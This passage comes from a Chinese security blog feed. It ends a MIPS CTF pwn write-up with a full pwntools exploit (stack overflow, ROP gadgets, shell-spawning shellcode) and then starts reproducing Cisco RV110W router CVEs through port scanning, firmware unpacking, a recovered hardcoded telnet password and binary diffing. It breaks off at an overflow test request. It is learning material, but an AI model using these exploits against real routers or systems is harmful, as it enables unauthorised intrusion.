class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">  v6 = (_BYTE *)<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">  <span class="built_in">puts</span>((<span class="keyword">int</span>)<span class="string">&quot;Enter the group number: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !_isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v18) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v18[<span class="number">0</span>] || v18[<span class="number">0</span>] &gt;= <span class="number">0xA</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">&quot;The numbers is illegal! Exit...\n&quot;</span>, <span class="number">1</span>, <span class="number">32</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v18[<span class="number">1</span>] = (<span class="keyword">int</span>)&amp;v3;</span><br><span class="line">  v9 = <span class="number">36</span>;</span><br><span class="line">  v10 = <span class="number">36</span> * v18[<span class="number">0</span>];</span><br><span class="line">  v11 = <span class="number">36</span> * v18[<span class="number">0</span>] - <span class="number">1</span>;</span><br><span class="line">  v12 = v4;</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">36</span> * v18[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i &lt; v18[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v18[<span class="number">0</span>] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v13 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)v12 + i * v9);</span><br><span class="line">    v14 = v13;</span><br><span class="line">    <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">puts</span>((<span class="keyword">int</span>)<span class="string">&quot;Enter the id and name, separated by `:`, end with `.` . eg =&gt; &#x27;1:Job.&#x27; &quot;</span>);</span><br><span class="line">    v15 = read(<span class="number">0</span>, v6, <span class="number">768</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v13 )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = atoi(v6);</span><br><span class="line">      *v14 = v0;</span><br><span class="line">      v16 = <span class="built_in">strchr</span>(v6, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; v6++; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *v6 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = v6;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v17 = &amp;v5[-v16];</span><br><span class="line">      <span class="keyword">if</span> ( !v16 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>((<span class="keyword">int</span>)<span class="string">&quot;format error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memcpy</span>(v14 + <span class="number">1</span>, v16 + <span class="number">1</span>, v17);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">      v14[<span class="number">1</span>] = <span class="string">&#x27;aaa\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很快可以发现溢出点：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v6 = (_BYTE *)<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">v15 = read(<span class="number">0</span>, v6, <span class="number">768</span>);</span><br><span class="line">v17 = &amp;v5[-v16];</span><br><span class="line"><span class="built_in">memcpy</span>(v14 + <span class="number">1</span>, v16 + <span class="number">1</span>, v17);</span><br></pre></td></tr></table></figure><p>它先是堆溢出然后再把堆上的内容<code>memcpy</code>到栈上</p><p>那接下来就该调试偏移了，<code>cyclic 200</code>发过去，发现覆盖到FP但到不了PC寄存器，只能自己算算偏移</p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/9.png" class=""><p>打开栈布局看看</p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/10.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paylaod = <span class="string">&#x27;1:&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>+p32(<span class="number">0xdeadbeef</span>)</span><br></pre></td></tr></table></figure><p>可以看到成功的覆盖了返回地址</p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/11.png" class=""><p>由于此程序是静态链接的文件，所以暂时不考虑<code>ret2libc</code>，还是<code>ROP+shellcode</code>的组合，通过<code>mipsrop</code>找到可用的<code>gadget</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.stackfinder()</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x004273C4  |  addiu $a2,$sp,0x70+var_C                            |  jalr  $s0                             |</span><br><span class="line">|  0x0042BCD0  |  addiu $a2,$sp,0x88+var_C                            |  jalr  $s2                             |</span><br><span class="line">|  0x0042FA00  |  addiu $v1,$sp,0x138+var_104                         |  jalr  $s1                             |</span><br><span class="line">|  0x004491F8  |  addiu $a2,$sp,0x44+var_C                            |  jalr  $s1                             |</span><br><span class="line">|  0x0044931C  |  addiu $v0,$sp,0x30+var_8                            |  jalr  $s1                             |</span><br><span class="line">|  0x00449444  |  addiu $a2,$sp,0x44+var_C                            |  jalr  $s1                             |</span><br><span class="line">|  0x0044AD58  |  addiu $a1,$sp,0x60+var_28                           |  jalr  $s4                             |</span><br><span class="line">|  0x0044AEFC  |  addiu $a1,$sp,0x64+var_28                           |  jalr  $s5                             |</span><br><span class="line">|  0x0044B154  |  addiu $a1,$sp,0x6C+var_38                           |  jalr  $s2                             |</span><br><span class="line">|  0x0044B1EC  |  addiu $v0,$sp,0x6C+var_40                           |  jalr  $s2                             |</span><br><span class="line">|  0x0044B3EC  |  addiu $v0,$sp,0x170+var_130                         |  jalr  $s0                             |</span><br><span class="line">|  0x00454E94  |  addiu $s7,$sp,0xB8+var_98                           |  jalr  $s3                             |</span><br><span class="line">|  0x00465BEC  |  addiu $a1,$sp,0xC4+var_98                           |  jalr  $s0                             |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">Found 13 matching gadgets</span><br><span class="line">Python&gt;mipsrop.find(&quot;move $t9,$a2&quot;)</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x00421684  |  move $t9,$a2                                        |  jr    $a2                             |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">Found 1 matching gadgets</span><br></pre></td></tr></table></figure><p>找到这两个可以用的<code>gadget</code>，第一条是将<code>0x70+var_C</code>加到<code>sp</code>上，<code>var_C</code>只有在程序运行的时候才知道，所以只能动调时候看偏移，加完之后呢，就把它放到<code>$a2</code>当中，然后跳转到<code>s0</code>去执行，第二条呢，就是把<code>$a2</code>放到<code>$t9</code>，再跳转到<code>$a2</code>，我们的目的就是在<code>0x70+var_C</code>上布置我们的<code>shellcode</code>，然后再跳到这上面去执行，但是仔细分析一下会发现，<code>$a2</code>是指向了我们的<code>shellcode</code>，但是却少了<code>$s0</code>到<code>$a2</code>的一个桥梁，回顾之前覆盖<code>$ra</code>寄存器的时候，好像把上面的一些寄存器也给覆盖了…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x004273C4  |  addiu $a2,$sp,0x70+var_C                            |  jalr  $s00x00421684  |  move $t9,$a2                                        |  jr    $a2</span><br></pre></td></tr></table></figure><p>没错，因为这是寄存器的值再函数开始的时候就入栈了</p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/12-1633421980905.png" class=""><p>既然有入栈那必然有出栈</p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/13-1633421980905.png" class=""><p>所以我们就能搭建起<code>$s0</code>到<code>$a2</code>的桥梁，既是覆盖的时候把<code>$s0</code>覆盖到跳转<code>$a2</code>的<code>gadget</code>即可，<strong>计算方法：0x90-$ra的偏移+$s0的偏移</strong>，并且再跳转<code>$ra</code>寄存器之前，它还清理了栈帧，所以<code>shellcode</code>放在<code>$ra</code>寄存器后的偏移即可，这也解释了之前的一堆<code>sw</code>是什么，这也是MIPS的特性，它并没有<code>push</code>和<code>pop</code>指令，而是通过<code>sw</code>和<code>lw</code>来实现入栈和出栈</p><p>在调试的的时候看到addiu $a2,$sp,0x70+var_C最终变成了addiu $a2,$sp,0x64，所以把shellcode的偏移改成0x64就可以不用靠”nop”滑板指令进行填充</p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/14-1633421980905.png" class=""><p>完整exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;big&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process([<span class="string">&quot;qemu-mips&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line"><span class="comment"># io = process([&quot;qemu-mips&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;./pwn&quot;])</span></span><br><span class="line"><span class="comment"># elf = ELF(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">ra = <span class="number">0x004273C4</span><span class="comment">#addiu $a2,$sp,0x70+var_C|  jalr  $s0</span></span><br><span class="line">s0 = <span class="number">0x00421684</span> <span class="comment">#move $t9,$a2|  jr    $a2</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;number:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter the id and name, separated by `:`, end with `.` . eg =&gt; &#x27;1:Job.&#x27; &quot;</span>)</span><br><span class="line">paylaod = <span class="string">&#x27;1:&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+p32(s0)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(ra)</span><br><span class="line">paylaod += <span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>+asm(<span class="string">&#x27;nop;nop;nop;nop&#x27;</span>)+shellcode</span><br><span class="line">io.sendline(paylaod)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>总结：<br>原来…<code>ghidra</code>里面的<code>var_C</code>这类参数是已经算好了，我就奇怪，为啥<code>xuanxuan</code>老师的各种参数都没有，我就有，现在就方便多了！</p><p><a href="https://github.com/NationalSecurityAgency/ghidra/releases">下载地址</a></p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/15-1633421980905.jpg" class=""><p>补充资料：</p><p><a href="https://www.cnblogs.com/L0g4n-blog/p/13968404.html">MIPS汇编学习</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF小知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RV110W路由器漏洞复现/2020年强网杯赛题</title>
      <link href="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/"/>
      <url>/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="RV110W路由器漏洞复现"><a href="#RV110W路由器漏洞复现" class="headerlink" title="RV110W路由器漏洞复现"></a>RV110W路由器漏洞复现</h1><blockquote><p>被<code>xuanxuan</code>老师种草了~，”一定要摸真实的设备”这句话余音绕梁，终于狠下心买了一个二手的<code>RV110W</code>，开始我的路由器漏洞复现之路，希望能学到点东西！</p></blockquote><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/25-1633419468547.jpg" class=""><h4 id="0x00-开端"><a href="#0x00-开端" class="headerlink" title="0x00 开端"></a>0x00 开端</h4><p>拿到路由器接上电源网线，电脑连接上<code>RV100W</code>就遇到了第一个问题，怎么进入后台？好吧，萌新没怎么玩过路由器，都是按照路由器背面的IP来登录，好巧不巧，它的背面很干净，啥都没有，看<code>lemon</code>师傅的视频看到10.10.10.1兴致冲冲的去访问，结果进了一个交换机的登录界面，奇了怪了，后来询问<code>lemon</code>师傅，要看路由器的网关IP进去，至此第一个问题顺利解决，初始密码是<code>cisco:cisco</code></p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/1.png" class=""><p>很顺利的进入后台，进入<code>Administration =&gt; Firmware/Language Upgrade</code>，看到固件的版本不对，是多少来着忘了，反正很老的一个固件，下面提供了固件的升级，我直接就拿<code>xuanxuan</code>老师的固件刷进去了，等了好一会，它就重启了，再次进入就发现固件版本已经变成1.2.2.5了</p><p><a href="https://xuanxuanblingbling.github.io/assets/attachment/RV110W_FW_1.2.2.5.bin">固件链接</a></p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/2-1633422409683.png" class=""><h4 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h4><p>到这，准备工作已经完成了！</p><p>那就开始真实环境下的漏洞复现了，首先一般我们想要找一个设备的漏洞，那得先看有什么服务吧！那么从服务很容易联想到端口，所以最开始我们先用<strong>端口扫描</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -sT -p0-65535 192.168.1.1</span><br></pre></td></tr></table></figure><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/3.png" class=""><p>扫完了，就想看看源码，就要对<strong>固件进行解包</strong>，固件提取拿以前的一张图来看</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/2.png" class=""><p>这里就是<code>xuanxuan</code>老师那边拿的，算是互联网搜索吧！</p><p><code>xuanxuan</code>老师那说要安装<code>sasquatch</code>这个组件，但是在<code>AttifyOs</code>那直接<code>binwalk</code>就开了？？？可能是<code>AttifyOs</code>的<code>binwalk</code>比较完整吧，不太清楚</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/4.png" class=""><p>解包完成之后，查看<code>busybox</code>的版本是<code>MIPS32</code>小端序的路由器</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/5.png" class=""><p>之后就是<strong>搜集漏洞信息</strong></p><h4 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h4><h3 id="CVE-2020-3330"><a href="#CVE-2020-3330" class="headerlink" title="CVE-2020-3330"></a>CVE-2020-3330</h3><p>之前扫到23端口是开着的，搜索发现大多数文件都是链接到rc这个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&gt; find . | xargs grep -ri &quot;admin:\\\$&quot;</span><br><span class="line">Binary file ./sbin/rc matches</span><br><span class="line">grep: ./usr/local/libexec/ipsec/setup: No such file or directory</span><br><span class="line">Binary file ./sbin/rc matches</span><br><span class="line">Binary file ./sbin/gpio_check matches</span><br><span class="line">Binary file ./sbin/write matches</span><br><span class="line">Binary file ./sbin/ca_manage matches</span><br><span class="line">Binary file ./sbin/ses_led matches</span><br><span class="line">Binary file ./sbin/ipsec_fqdn_detect matches</span><br><span class="line">Binary file ./sbin/sendudp matches</span><br><span class="line">Binary file ./sbin/check_ses_led matches</span><br><span class="line">Binary file ./sbin/stats matches</span><br><span class="line">Binary file ./sbin/ddns_update_data matches</span><br><span class="line">Binary file ./sbin/services matches</span><br><span class="line">Binary file ./sbin/restore matches</span><br><span class="line">Binary file ./sbin/info matches</span><br><span class="line">Binary file ./sbin/preinit matches</span><br><span class="line">Binary file ./sbin/qkvpn_rekey matches</span><br><span class="line">Binary file ./sbin/ipsec-up matches</span><br><span class="line">Binary file ./sbin/calc_vpnconn_time matches</span><br><span class="line">Binary file ./sbin/bootnv matches</span><br><span class="line">Binary file ./sbin/ipsec_wanlink matches</span><br><span class="line">Binary file ./sbin/usb_test matches</span><br><span class="line">Binary file ./sbin/icmp_echo matches</span><br><span class="line">Binary file ./sbin/cron_iaprule matches</span><br><span class="line">Binary file ./sbin/waninfo matches</span><br><span class="line">Binary file ./sbin/ntpd matches</span><br><span class="line">Binary file ./sbin/detectwan matches</span><br><span class="line">Binary file ./sbin/ipsec_fw matches</span><br><span class="line">Binary file ./sbin/ddns_success matches</span><br><span class="line">Binary file ./sbin/cpu_usage matches</span><br><span class="line">Binary file ./sbin/cron_aclrule matches</span><br><span class="line">Binary file ./sbin/firewall matches</span><br><span class="line">Binary file ./sbin/generate_md5sum matches</span><br><span class="line">Binary file ./sbin/init matches</span><br><span class="line">Binary file ./sbin/listen matches</span><br><span class="line">Binary file ./sbin/check_ps matches</span><br><span class="line">Binary file ./sbin/snmpdc matches</span><br><span class="line">Binary file ./sbin/process_monitor matches</span><br><span class="line">Binary file ./sbin/rc matches</span><br></pre></td></tr></table></figure><p>把放到IDA里面，搜字符串定位关键函数</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/26.jpg" class=""><p>随便翻下就有了个明文字符串，拿去解一下MD5</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/27.jpg" class=""><p>密码就出来了，我们就可以通过<code>telnet</code>来传<code>gdbserver</code>就不用拆机器了</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/6.png" class=""><h3 id="CVE-2020-3331-CVE-2020-3323"><a href="#CVE-2020-3331-CVE-2020-3323" class="headerlink" title="CVE-2020-3331/CVE-2020-3323"></a>CVE-2020-3331/CVE-2020-3323</h3><h5 id="Diff"><a href="#Diff" class="headerlink" title="Diff"></a>Diff</h5><p>1.2.2.5这个固件的版本相对来说比较旧，所以一个很常用的手法就是去<code>diff</code>文件，拿已经修复此漏洞的固件进行<code>diff</code>，能够更容易的去定位漏洞点，<code>diff</code>有俩常见的工具，<code>bindiff</code>和<code>diaphora</code></p><h6 id="bindiff"><a href="#bindiff" class="headerlink" title="bindiff"></a>bindiff</h6><p><a href="https://www.zynamics.com/software.html">bindiff下载链接</a></p><p>选<code>.msi</code>下载就行，安装路径为IDA的主目录，之后打开IDA在插件那边就能看见<code>bindiff</code>了，把要比对的文件先打开再保存成<code>idb</code>文件，然后点<code>bindiff</code>选择要比对的<code>idb</code>就能开始比对啦！</p><p><code>ps：user</code>的目录不要有中文，否则你会很不幸</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/8.jpg" class=""><p>越往下滑呢！它就越有可能是目标，因为越下面就越不匹配，由于漏洞描述是前台的洞，所以选中的那个函数有可能就是目标，这里简单讲讲我认识什么的前台什么的后台？</p><p>前台：与用户进行交互的界面</p><p>后台：对用户隐藏的那部分数据处理与逻辑处理</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/9.jpg" class=""><p>查阅资料得知，每个基本块颜色的说明：</p><blockquote><p>绿色：相同的基本块</p><p>黄色：修改的基本块</p><p>红色：删掉的基本块</p><p>灰色：新加的基本块</p></blockquote><p>右键<code>view flow graphs</code>就可以查看汇编代码对比，找了半天才找到，就离谱</p><p><code>ps：</code>千万不要直接把两个<code>idb</code>直接丢到<code>idb</code>，不然你会知道什么叫浪费时间（<code>bindiff</code>直接打开的分析速度感人</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/10.jpg" class=""><p>除此之外，你如果对二进制的漏洞点以及危险函数比较熟悉的话，双击点进去，很容易就看到这个没有限制长度的<code>sscanf</code></p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/11.jpg" class=""><h6 id="diaphora"><a href="#diaphora" class="headerlink" title="diaphora"></a>diaphora</h6><p>吐了，老是报错整不好了…，<code>bindiff</code>也能用的啦！只不过是看汇编，<code>diaphora</code>可以看源码，下次再补上…</p><p>**%[ ^;];%*[ ^=]=%[ ^\n]**是一个正则表达式，%是代表选择，%*是过滤    </p><blockquote><ol><li><code>%[^;]</code>：分号前的所有字符都要</li><li><code>;%*[^=]</code>：分号后，等号前的字符都不要</li><li><code>=%[^\n]</code>：等号后，换行符前的所有字符都要</li></ol></blockquote><p>看不是很懂，那就上个<code>demo</code>吧！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> var1[<span class="number">5</span>] = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> var2[<span class="number">5</span>] = <span class="string">&quot;bbb&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> var3[<span class="number">5</span>] = <span class="string">&quot;ccc&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> welcome[<span class="number">100</span>] = <span class="string">&quot;wElc0me t= reGuIar @xpr&amp;ss!0n w0rld;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">sscanf</span>(welcome,<span class="string">&quot;%[^;];%*[^=]=%[^\n]&quot;</span>, var1, var2, var3);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n%s\n%s\n&quot;</span>,var1,var2,var3);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到运行结果，还是很奇怪，留坑了…</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/12.png" class=""><p>发包测试一下是否存在溢出，发送GET报文发现并没有什么事情发生</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:<span class="string">&quot;status_guestnet.asp&quot;</span>+<span 